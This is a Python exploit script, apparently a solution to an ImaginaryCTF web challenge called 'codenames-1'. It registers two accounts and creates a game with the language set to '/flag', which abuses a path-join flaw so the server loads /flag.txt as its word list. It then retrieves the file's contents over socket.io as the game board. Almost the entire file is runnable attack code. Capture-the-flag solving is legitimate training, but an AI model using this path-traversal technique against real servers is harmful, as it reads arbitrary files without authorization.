#!/usr/bin/env python3
import sys
import re
import time
import requests
import socketio
from urllib.parse import urljoin

BASE = "http://codenames-1.chal.imaginaryctf.org/"

def absurl(base, path):
    return urljoin(base.rstrip('/')+'/', path.lstrip('/'))

def get_session_cookie(sess):
    for c in sess.cookies:
        if c.name == "session":
            return f"{c.name}={c.value}"
    raise RuntimeError("No Flask session cookie found")

def register(sess, base, username, password):
    sess.get(absurl(base, "/register"), timeout=10)
    r = sess.post(absurl(base, "/register"),
                  data={"username": username, "password": password},
                  allow_redirects=False, timeout=10)
    if r.status_code not in (302, 303):
        raise RuntimeError(f"register failed ({r.status_code})")

def create_game(sess, base, language):
    r = sess.post(absurl(base, "/create_game"),
                  data={"language": language, "hard_mode": ""},  # no hard mode needed
                  allow_redirects=False, timeout=10)
    if r.status_code not in (302, 303):
        raise RuntimeError(f"create_game failed ({r.status_code})")
    loc = r.headers.get("Location", "")
    m = re.search(r"/game/([A-Z0-9]{6})", loc)
    if not m:
        r2 = sess.get(urljoin(base, loc), allow_redirects=True, timeout=10)
        m = re.search(r"/game/([A-Z0-9]{6})", r2.url)
        if not m:
            raise RuntimeError("could not find game code")
    return m.group(1)

def join_game(sess, base, code):
    r = sess.post(absurl(base, "/join_game"),
                  data={"code": code},
                  allow_redirects=True, timeout=10)
    if r.status_code not in (200, 302, 303):
        raise RuntimeError(f"join_game failed ({r.status_code})")

class Player:
    def __init__(self, base, code, cookie_header, name):
        self.base = base
        self.code = code
        self.cookie_header = cookie_header
        self.name = name
        self.started_payload = None
        self.sio = socketio.Client(reconnection=False)

        @self.sio.event
        def connect():
            # Immediately send the 'join' event required by the server
            self.sio.emit("join")

        @self.sio.on("start_game")
        def on_start_game(data):
            self.started_payload = data

    def connect(self):
        # include ?code=... in the URL so server can read request.args.get('code')
        url = absurl(self.base, f"/socket.io/?code={self.code}")
        self.sio.connect(
            url,
            transports=["websocket"],        # websocket only avoids polling quirks
            headers={"Cookie": self.cookie_header},
            socketio_path="socket.io",
        )

    def wait_start(self, timeout=10.0):
        t0 = time.time()
        while self.started_payload is None and time.time() - t0 < timeout:
            time.sleep(0.05)
        return self.started_payload

def main():
    base = sys.argv[1] if len(sys.argv) > 1 else BASE
    if not base.startswith(("http://", "https://")):
        base = "http://" + base

    A = requests.Session()
    B = requests.Session()

    import random, string
    def randuser():
        return "u" + "".join(random.choices(string.ascii_lowercase+string.digits, k=8))
    u1, p1 = randuser(), "thisislongenough"
    u2, p2 = randuser(), "thisislongenough"

    register(A, base, u1, p1)
    register(B, base, u2, p2)

    # Use absolute path to pivot join('words', '/flag.txt') -> '/flag.txt'
    code = create_game(A, base, "/flag")
    join_game(B, base, code)

    ckA = get_session_cookie(A)
    ckB = get_session_cookie(B)

    pA = Player(base, code, ckA, u1)
    pB = Player(base, code, ckB, u2)

    pA.connect()
    pB.connect()

    payA = pA.wait_start()
    payB = pB.wait_start()

    payload = payA or payB
    if not payload:
        raise RuntimeError("did not receive start_game (both sockets must connect and emit 'join')")

    board = payload.get("board", [])
    if not board:
        raise RuntimeError("no board received")


    uniq = list(dict.fromkeys(w.strip() for w in board if w and w.strip()))
    print("[+] Unique board entries:")
    for w in uniq:
        print(w)

    for w in uniq:
        if "{" in w and "}" in w:
            print("\n[+] Likely flag:\n" + w)
            break

if __name__ == "__main__":
    main()